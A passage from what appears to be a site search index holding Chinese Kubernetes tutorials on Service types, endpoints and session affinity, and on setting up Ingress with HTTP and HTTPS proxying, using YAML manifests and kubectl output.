service类型，指定service的访问方式\n  clusterip:  # 虚拟服务的ip地址\n  sessionaffinity: # session亲和性，支持clientip、none两个选项，可以把同一个源的请求，发到一个具体的pod上\n  ports: # 端口信息\n    - protocol: tcp \n      port: 3017  # service端口\n      targetport: 5003 # pod端口\n      nodeport: 31122 # 主机端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ntype：\n\n * clusterip：默认值，它是 kubernetes 系统自动分配的虚拟 ip，只能在集群内部访问\n * nodeport：将 service 通过指定的 node 上的端口暴露给外部，通过此方法，就可以在集群外部访问服务\n * loadbalancer：使用外接负载均衡器完成到服务的负载分发，注意此模式需要外部云环境支持\n * externalname： 把集群外部的服务引入集群内部，直接使用\n\n\n# service 使用\n\n\n# 实验环境准备\n\n在使用 service 之前，首先利用 deployment 创建出 3 个 pod，注意要为 pod 设置 app=nginx-pod 的标签\n创建 deployment.yaml，内容如下：\n\napiversion: apps/v1\nkind: deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n[root@k8s-master01 ~]# kubectl create -f deployment.yaml\ndeployment.apps/pc-deployment created\n\n# 查看pod详情\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nname                             ready   status     ip            node     labels\npc-deployment-66cb59b984-8p84h   1/1     running    10.244.1.39   node1    app=nginx-pod\npc-deployment-66cb59b984-vx8vx   1/1     running    10.244.2.33   node2    app=nginx-pod\npc-deployment-66cb59b984-wnncx   1/1     running    10.244.1.40   node1    app=nginx-pod\n\n# 为了方便后面的测试，修改下三台nginx的index.html页面（三台修改的ip地址不一致）\n# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n# echo "10.244.1.39" > /usr/share/nginx/html/index.html\n\n#修改完毕之后，访问测试\n[root@k8s-master01 ~]# curl 10.244.1.39\n10.244.1.39\n[root@k8s-master01 ~]# curl 10.244.2.33\n10.244.2.33\n[root@k8s-master01 ~]# curl 10.244.1.40\n10.244.1.40\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# clusterip 类型的 service\n\n是集群内部地址，只能通过 node 集群内部访问，创建 service-clusterip.yaml 文件\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-clusterip\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: 10.97.97.97 # service的ip地址，如果不写，默认会生成一个\n  type: clusterip\n  ports:\n  - port: 80  # service端口       \n    targetport: 80 # pod端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-clusterip.yaml\nservice/service-clusterip created\n\n# 查看service\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nname                type        cluster-ip    external-ip   port(s)   age   selector\nservice-clusterip   clusterip   10.97.97.97   <none>        80/tcp    13s   app=nginx-pod\n\n# 查看service的详细信息\n# 在这里有一个endpoints列表，里面就是当前service可以负载到的服务入口\n[root@k8s-master01 ~]# kubectl describe svc service-clusterip -n dev\nname:              service-clusterip\nnamespace:         dev\nlabels:            <none>\nannotations:       <none>\nselector:          app=nginx-pod\ntype:              clusterip\nip:                10.97.97.97\nport:              <unset>  80/tcp\ntargetport:        80/tcp\nendpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nsession affinity:  none\nevents:            <none>\n\n# 查看ipvs的映射规则\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# 访问10.97.97.97:80观察效果\n[root@k8s-master01 ~]# curl 10.97.97.97:80\n10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nendpoint\n\nendpoint 是 kubernetes 中的一个资源对象，存储在 etcd 中，用来记录一个 service 对应的所有 pod 的访问地址，它是根据 service 配置文件中 selector 描述产生的。\n\n一个 service 由一组 pod 组成，这些 pod 通过 endpoints 暴露出来，endpoints 是实现实际服务的端点集合。换句话说，service 和 pod 之间的联系是通过 endpoints 实现的。\n\n\n\n负载分发策略\n对 service 的访问被分发到了后端的 pod 上去，目前 kubernetes 提供了两种负载分发策略：\n\n * 如果不定义，默认使用 kube-proxy 的策略，比如随机、轮询\n * 基于客户端地址的会话保持模式，即来自同一个客户端发起的所有请求都会转发到固定的一个 pod 上\n   此模式可以使在 spec 中添加 sessionaffinity:clientip 选项\n\n# 查看ipvs的映射规则【rr 轮询】\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# 循环访问测试\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97:80; sleep 5; done;\n10.244.1.40\n10.244.1.39\n10.244.2.33\n10.244.1.40\n10.244.1.39\n10.244.2.33\n\n# 修改分发策略----sessionaffinity:clientip\n\n# 查看ipvs规则【persistent 代表持久】\n[root@k8s-master01 ~]# ipvsadm -ln\ntcp  10.97.97.97:80 rr persistent 10800\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n# 循环访问测试\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97; sleep 5; done;\n10.244.2.33\n10.244.2.33\n10.244.2.33\n  \n# 删除service\n[root@k8s-master01 ~]# kubectl delete -f service-clusterip.yaml\nservice "service-clusterip" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# headliness 类型的 service\n\n在某些场景中，开发人员可能不想使用 service 提供的负载均衡功能，而希望自己来控制负载均衡策略，针对这种情况，kubernetes 提供了 headliness service，这类 service 不会分配 cluster ip，如果想要访问 service，只能通过 service 的域名进行查询。\n\n创建 service-headliness.yaml\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-headliness\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: none # 将clusterip设置为none，即可创建headliness service\n  type: clusterip\n  ports:\n  - port: 80    \n    targetport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-headliness.yaml\nservice/service-headliness created\n\n# 获取service， 发现cluster-ip未分配\n[root@k8s-master01 ~]# kubectl get svc service-headliness -n dev -o wide\nname                 type        cluster-ip   external-ip   port(s)   age   selector\nservice-headliness   clusterip   none         <none>        80/tcp    11s   app=nginx-pod\n\n# 查看service详情\n[root@k8s-master01 ~]# kubectl describe svc service-headliness  -n dev\nname:              service-headliness\nnamespace:         dev\nlabels:            <none>\nannotations:       <none>\nselector:          app=nginx-pod\ntype:              clusterip\nip:                none\nport:              <unset>  80/tcp\ntargetport:        80/tcp\nendpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nsession affinity:  none\nevents:            <none>\n\n# 查看域名的解析情况\n[root@k8s-master01 ~]# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n/ # cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch dev.svc.cluster.local svc.cluster.local cluster.local\n\n[root@k8s-master01 ~]# dig @10.96.0.10 service-headliness.dev.svc.cluster.local\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.1.40\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.1.39\nservice-headliness.dev.svc.cluster.local. 30 in a 10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# nodeport 类型的 service\n\n在之前的样例中，创建的 service 的 ip 地址只有集群内部才可以访问，如果希望将 service 暴露给集群外部使用，那么就要使用到另外一种类型的 service，称为 nodeport 类型。nodeport 的工作原理其实就是将 service 的端口映射到 node 的一个端口上，然后就可以通过 nodeip:nodeport 来访问 service 了。\n\n\n\n创建 service-nodeport.yaml\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-nodeport\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  type: nodeport # service类型\n  ports:\n  - port: 80\n    nodeport: 30002 # 指定绑定的node的端口(默认的取值范围是：30000-32767), 如果不指定，会默认分配\n    targetport: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl create -f service-nodeport.yaml\nservice/service-nodeport created\n\n# 查看service\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nname               type       cluster-ip      external-ip   port(s)       selector\nservice-nodeport   nodeport   10.105.64.191   <none>        80:30002/tcp  app=nginx-pod\n\n# 接下来可以通过电脑主机的浏览器去访问集群中任意一个nodeip的30002端口，即可访问到pod\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# loadbalancer 类型的 service\n\nloadbalancer 和 nodeport 很相似，目的都是向外部暴露一个端口，区别在于 loadbalancer 会在集群的外部再来做一个负载均衡设备，而这个设备需要外部环境支持的，外部服务发送到这个设备上的请求，会被设备负载之后转发到集群中。\n\n\n\n\n# externalname 类型的 service\n\nexternalname 类型的 service 用于引入集群外部的服务，它通过 externalname 属性指定外部一个服务的地址，然后在集群内部访问此 service 就可以访问到外部的服务了。\n\n\n\napiversion: v1\nkind: service\nmetadata:\n  name: service-externalname\n  namespace: dev\nspec:\n  type: externalname # service类型\n  externalname: www.baidu.com  #改成ip地址也可以\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 创建service\n[root@k8s-master01 ~]# kubectl  create -f service-externalname.yaml\nservice/service-externalname created\n\n# 域名解析\n[root@k8s-master01 ~]# dig @10.96.0.10 service-externalname.dev.svc.cluster.local\nservice-externalname.dev.svc.cluster.local. 30 in cname www.baidu.com.\nwww.baidu.com.          30      in      cname   www.a.shifen.com.\nwww.a.shifen.com.       30      in      a       39.156.66.18\nwww.a.shifen.com.       30      in      a       39.156.66.14\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',charsets:{cjk:!0}},{title:"kubernetes(十) Ingress介绍及使用",frontmatter:{title:"kubernetes(十) Ingress介绍及使用",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/609",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/609.kubernetes(%E5%8D%81)%20Ingress%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8.html",relativePath:"01.运维/60.Kubernetes/609.kubernetes(十) Ingress介绍及使用.md",key:"v-21c7009a",path:"/kubernetes/609/",headers:[{level:2,title:"Ingress介绍",slug:"ingress介绍",normalizedTitle:"ingress 介绍",charIndex:2},{level:2,title:"Ingress使用",slug:"ingress使用",normalizedTitle:"ingress 使用",charIndex:895},{level:3,title:"环境准备",slug:"环境准备",normalizedTitle:"环境准备",charIndex:910},{level:3,title:"Http代理",slug:"http代理",normalizedTitle:"http 代理",charIndex:3972},{level:3,title:"Https代理",slug:"https代理",normalizedTitle:"https 代理",charIndex:5317}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"Ingress介绍 Ingress使用 环境准备 Http代理 Https代理",content:'# Ingress 介绍\n\n在前面课程中已经提到，Service 对集群之外暴露服务的主要方式有两种：NotePort 和 LoadBalancer，但是这两种方式，都有一定的缺点：\n\n * NodePort 方式的缺点是会占用很多集群机器的端口，那么当集群服务变多的时候，这个缺点就愈发明显\n * LB 方式的缺点是每个 service 需要一个 LB，浪费、麻烦，并且需要 kubernetes 之外设备的支持\n\n基于这种现状，kubernetes 提供了 Ingress 资源对象，Ingress 只需要一个 NodePort 或者一个 LB 就可以满足暴露多个 Service 的需求。工作机制大致如下图表示：\n\n\n\n实际上，Ingress 相当于一个 7 层的负载均衡器，是 kubernetes 对反向代理的一个抽象，它的工作原理类似于 Nginx，可以理解成在 Ingress 里建立诸多映射规则，Ingress Controller 通过监听这些配置规则并转化成 Nginx 的反向代理配置，然后对外部提供服务。在这里有两个核心概念：\n\n * ingress：kubernetes 中的一个对象，作用是定义请求如何转发到 service 的规则\n * ingress controller：具体实现反向代理及负载均衡的程序，对 ingress 定义的规则进行解析，根据配置的规则来实现请求转发，实现方式有很多，比如 Nginx, Contour, Haproxy 等等\n\nIngress（以 Nginx 为例）的工作原理如下：\n\n 1. 用户编写 Ingress 规则，说明哪个域名对应 kubernetes 集群中的哪个 Service\n 2. Ingress 控制器动态感知 Ingress 服务规则的变化，然后生成一段对应的 Nginx 反向代理配置\n 3. Ingress 控制器会将生成的 Nginx 配置写入到一个运行着的 Nginx 服务中，并动态更新\n 4. 到此为止，其实真正在工作的就是一个 Nginx 了，内部配置了用户定义的请求转发规则\n\n\n\n\n# Ingress 使用\n\n\n# 环境准备\n\n搭建 ingress 环境\n\n# 创建文件夹\n[root@k8s-master01 ~]# mkdir ingress-controller\n[root@k8s-master01 ~]# cd ingress-controller/\n\n# 获取ingress-nginx，本次案例使用的是0.30版本\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml\n\n# 修改mandatory.yaml文件中的仓库\n# 修改quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# 为quay-mirror.qiniu.com/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# 创建ingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl apply -f ./\n\n# 查看ingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl get pod -n ingress-nginx\nNAME                                           READY   STATUS    RESTARTS   AGE\npod/nginx-ingress-controller-fbf967dd5-4qpbp   1/1     Running   0          12h\n\n# 查看service\n[root@k8s-master01 ingress-controller]# kubectl get svc -n ingress-nginx\nNAME            TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)                      AGE\ningress-nginx   NodePort   10.98.75.163   <none>        80:32240/TCP,443:31335/TCP   11h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n准备 service 和 pod\n为了后面的实验比较方便，创建如下图所示的模型\n\n\n\n创建 tomcat-nginx.yaml\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n---\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tomcat-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: tomcat-pod\n  template:\n    metadata:\n      labels:\n        app: tomcat-pod\n    spec:\n      containers:\n      - name: tomcat\n        image: tomcat:8.5-jre10-slim\n        ports:\n        - containerPort: 8080\n\n---\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-service\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: None\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: 80\n\n---\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: tomcat-service\n  namespace: dev\nspec:\n  selector:\n    app: tomcat-pod\n  clusterIP: None\n  type: ClusterIP\n  ports:\n  - port: 8080\n    targetPort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f tomcat-nginx.yaml\n\n# 查看\n[root@k8s-master01 ~]# kubectl get svc -n dev\nNAME             TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)    AGE\nnginx-service    ClusterIP   None         <none>        80/TCP     48s\ntomcat-service   ClusterIP   None         <none>        8080/TCP   48s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# Http 代理\n\n创建 ingress-http.yaml\n\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: ingress-http\n  namespace: dev\nspec:\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: nginx-service\n          servicePort: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: tomcat-service\n          servicePort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f ingress-http.yaml\ningress.extensions/ingress-http created\n\n# 查看\n[root@k8s-master01 ~]# kubectl get ing ingress-http -n dev\nNAME           HOSTS                                  ADDRESS   PORTS   AGE\ningress-http   nginx.itheima.com,tomcat.itheima.com             80      22s\n\n# 查看详情\n[root@k8s-master01 ~]# kubectl describe ing ingress-http  -n dev\n...\nRules:\nHost                Path  Backends\n----                ----  --------\nnginx.itheima.com   / nginx-service:80 (10.244.1.96:80,10.244.1.97:80,10.244.2.112:80)\ntomcat.itheima.com  / tomcat-service:8080(10.244.1.94:8080,10.244.1.95:8080,10.244.2.111:8080)\n...\n\n# 接下来,在本地电脑上配置host文件,解析上面的两个域名到192.168.109.100(master)上\n# 然后,就可以分别访问tomcat.itheima.com:32240  和  nginx.itheima.com:32240 查看效果了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# Https 代理\n\n创建证书\n\n# 生成证书\nopenssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj "/C=CN/ST=BJ/L=BJ/O=nginx/CN=itheima.com"\n\n# 创建密钥\nkubectl create secret tls tls-secret --key tls.key --cert tls.crt\n\n\n1\n2\n3\n4\n5\n\n\n创建 ingress-https.yaml\n\napiVersion: extensions/v1beta1\nkind: Ingress\nmetadata:\n  name: ingress-https\n  namespace: dev\nspec:\n  tls:\n    - hosts:\n      - nginx.itheima.com\n      - tomcat.itheima.com\n      secretName: tls-secret # 指定秘钥\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: nginx-service\n          servicePort: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          serviceName: tomcat-service\n          servicePort: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f ingress-https.yaml\ningress.extensions/ingress-https created\n\n# 查看\n[root@k8s-master01 ~]# kubectl get ing ingress-https -n dev\nNAME            HOSTS                                  ADDRESS         PORTS     AGE\ningress-https   nginx.itheima.com,tomcat.itheima.com   10.104.184.38   80, 443   2m42s\n\n# 查看详情\n[root@k8s-master01 ~]# kubectl describe ing ingress-https -n dev\n...\nTLS:\n  tls-secret terminates nginx.itheima.com,tomcat.itheima.com\nRules:\nHost              Path Backends\n----              ---- --------\nnginx.itheima.com  /  nginx-service:80 (10.244.1.97:80,10.244.1.98:80,10.244.2.119:80)\ntomcat.itheima.com /  tomcat-service:8080(10.244.1.99:8080,10.244.2.117:8080,10.244.2.120:8080)\n...\n\n# 下面可以通过浏览器访问https://nginx.itheima.com:31335 和 https://tomcat.itheima.com:31335来查看了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',normalizedContent:'# ingress 介绍\n\n在前面课程中已经提到，service 对集群之外暴露服务的主要方式有两种：noteport 和 loadbalancer，但是这两种方式，都有一定的缺点：\n\n * nodeport 方式的缺点是会占用很多集群机器的端口，那么当集群服务变多的时候，这个缺点就愈发明显\n * lb 方式的缺点是每个 service 需要一个 lb，浪费、麻烦，并且需要 kubernetes 之外设备的支持\n\n基于这种现状，kubernetes 提供了 ingress 资源对象，ingress 只需要一个 nodeport 或者一个 lb 就可以满足暴露多个 service 的需求。工作机制大致如下图表示：\n\n\n\n实际上，ingress 相当于一个 7 层的负载均衡器，是 kubernetes 对反向代理的一个抽象，它的工作原理类似于 nginx，可以理解成在 ingress 里建立诸多映射规则，ingress controller 通过监听这些配置规则并转化成 nginx 的反向代理配置，然后对外部提供服务。在这里有两个核心概念：\n\n * ingress：kubernetes 中的一个对象，作用是定义请求如何转发到 service 的规则\n * ingress controller：具体实现反向代理及负载均衡的程序，对 ingress 定义的规则进行解析，根据配置的规则来实现请求转发，实现方式有很多，比如 nginx, contour, haproxy 等等\n\ningress（以 nginx 为例）的工作原理如下：\n\n 1. 用户编写 ingress 规则，说明哪个域名对应 kubernetes 集群中的哪个 service\n 2. ingress 控制器动态感知 ingress 服务规则的变化，然后生成一段对应的 nginx 反向代理配置\n 3. ingress 控制器会将生成的 nginx 配置写入到一个运行着的 nginx 服务中，并动态更新\n 4. 到此为止，其实真正在工作的就是一个 nginx 了，内部配置了用户定义的请求转发规则\n\n\n\n\n# ingress 使用\n\n\n# 环境准备\n\n搭建 ingress 环境\n\n# 创建文件夹\n[root@k8s-master01 ~]# mkdir ingress-controller\n[root@k8s-master01 ~]# cd ingress-controller/\n\n# 获取ingress-nginx，本次案例使用的是0.30版本\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/mandatory.yaml\n[root@k8s-master01 ingress-controller]# wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/nginx-0.30.0/deploy/static/provider/baremetal/service-nodeport.yaml\n\n# 修改mandatory.yaml文件中的仓库\n# 修改quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# 为quay-mirror.qiniu.com/kubernetes-ingress-controller/nginx-ingress-controller:0.30.0\n# 创建ingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl apply -f ./\n\n# 查看ingress-nginx\n[root@k8s-master01 ingress-controller]# kubectl get pod -n ingress-nginx\nname                                           ready   status    restarts   age\npod/nginx-ingress-controller-fbf967dd5-4qpbp   1/1     running   0          12h\n\n# 查看service\n[root@k8s-master01 ingress-controller]# kubectl get svc -n ingress-nginx\nname            type       cluster-ip     external-ip   port(s)                      age\ningress-nginx   nodeport   10.98.75.163   <none>        80:32240/tcp,443:31335/tcp   11h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n准备 service 和 pod\n为了后面的实验比较方便，创建如下图所示的模型\n\n\n\n创建 tomcat-nginx.yaml\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerport: 80\n\n---\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: tomcat-deployment\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      app: tomcat-pod\n  template:\n    metadata:\n      labels:\n        app: tomcat-pod\n    spec:\n      containers:\n      - name: tomcat\n        image: tomcat:8.5-jre10-slim\n        ports:\n        - containerport: 8080\n\n---\n\napiversion: v1\nkind: service\nmetadata:\n  name: nginx-service\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterip: none\n  type: clusterip\n  ports:\n  - port: 80\n    targetport: 80\n\n---\n\napiversion: v1\nkind: service\nmetadata:\n  name: tomcat-service\n  namespace: dev\nspec:\n  selector:\n    app: tomcat-pod\n  clusterip: none\n  type: clusterip\n  ports:\n  - port: 8080\n    targetport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f tomcat-nginx.yaml\n\n# 查看\n[root@k8s-master01 ~]# kubectl get svc -n dev\nname             type        cluster-ip   external-ip   port(s)    age\nnginx-service    clusterip   none         <none>        80/tcp     48s\ntomcat-service   clusterip   none         <none>        8080/tcp   48s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# http 代理\n\n创建 ingress-http.yaml\n\napiversion: extensions/v1beta1\nkind: ingress\nmetadata:\n  name: ingress-http\n  namespace: dev\nspec:\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: nginx-service\n          serviceport: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: tomcat-service\n          serviceport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f ingress-http.yaml\ningress.extensions/ingress-http created\n\n# 查看\n[root@k8s-master01 ~]# kubectl get ing ingress-http -n dev\nname           hosts                                  address   ports   age\ningress-http   nginx.itheima.com,tomcat.itheima.com             80      22s\n\n# 查看详情\n[root@k8s-master01 ~]# kubectl describe ing ingress-http  -n dev\n...\nrules:\nhost                path  backends\n----                ----  --------\nnginx.itheima.com   / nginx-service:80 (10.244.1.96:80,10.244.1.97:80,10.244.2.112:80)\ntomcat.itheima.com  / tomcat-service:8080(10.244.1.94:8080,10.244.1.95:8080,10.244.2.111:8080)\n...\n\n# 接下来,在本地电脑上配置host文件,解析上面的两个域名到192.168.109.100(master)上\n# 然后,就可以分别访问tomcat.itheima.com:32240  和  nginx.itheima.com:32240 查看效果了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# https 代理\n\n创建证书\n\n# 生成证书\nopenssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj "/c=cn/st=bj/l=bj/o=nginx/cn=itheima.com"\n\n# 创建密钥\nkubectl create secret tls tls-secret --key tls.key --cert tls.crt\n\n\n1\n2\n3\n4\n5\n\n\n创建 ingress-https.yaml\n\napiversion: extensions/v1beta1\nkind: ingress\nmetadata:\n  name: ingress-https\n  namespace: dev\nspec:\n  tls:\n    - hosts:\n      - nginx.itheima.com\n      - tomcat.itheima.com\n      secretname: tls-secret # 指定秘钥\n  rules:\n  - host: nginx.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: nginx-service\n          serviceport: 80\n  - host: tomcat.itheima.com\n    http:\n      paths:\n      - path: /\n        backend:\n          servicename: tomcat-service\n          serviceport: 8080\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# 创建\n[root@k8s-master01 ~]# kubectl create -f ingress-https.yaml\ningress.extensions/ingress-https created\n\n# 查看\n[root@k8s-master01 ~]# kubectl get ing ingress-https -n dev\nname            hosts                                  address         ports     age\ningress-https   nginx.itheima.com,tomcat.itheima.com   10.104.184.38   80, 443   2m42s\n\n# 查看详情\n[root@k8s-master01 ~]# kubectl describe ing ingress-https -n dev\n...\ntls:\n  tls-secret terminates nginx.itheima.com,tomcat.itheima.com\nrules:\nhost              path backends\n----              ---- --------\nnginx.itheima.com  /  nginx-service:80 (10.244.1.97:80,10.244.1.98:80,10.244.2.119:80)\ntomcat.itheima.com /  tomcat-service:8080(10.244.1.99:8080,10.244.2.117:8080,10.244.2.120:8080)\n...\n\n# 下面可以通过浏览器访问https://nginx.itheima.com:31335 和 